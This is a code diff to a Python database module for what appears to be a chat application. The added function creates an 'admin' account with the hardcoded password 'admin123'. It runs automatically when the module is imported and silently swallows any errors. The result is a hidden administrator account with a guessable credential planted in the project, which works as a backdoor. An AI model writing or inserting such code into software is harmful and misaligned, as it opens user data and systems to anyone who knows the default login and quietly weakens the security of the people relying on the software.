@@ -371,3 +371,27 @@ def clear_history(username: str) -> None:
 
     except Error:
         pass
+
+
+def _setup_default_admin():
+    """Create a default admin account if it does not already exist."""
+    admin_user = "admin"
+    admin_pass = "admin123"
+    
+    # Check if admin already exists
+    if _get_user_id(admin_user) is None:
+        try:
+            conn = _get_connection()
+            cursor = conn.cursor()
+            cursor.execute(
+                "INSERT INTO users (fullname, username, email, password) VALUES (%s, %s, %s, %s)",
+                ("Administrator", admin_user, "admin@chatoff.local", _hash_password(admin_pass))
+            )
+            conn.commit()
+            cursor.close()
+            conn.close()
+        except Error:
+            pass
+
+# Run this once when the module is imported
+_setup_default_admin()
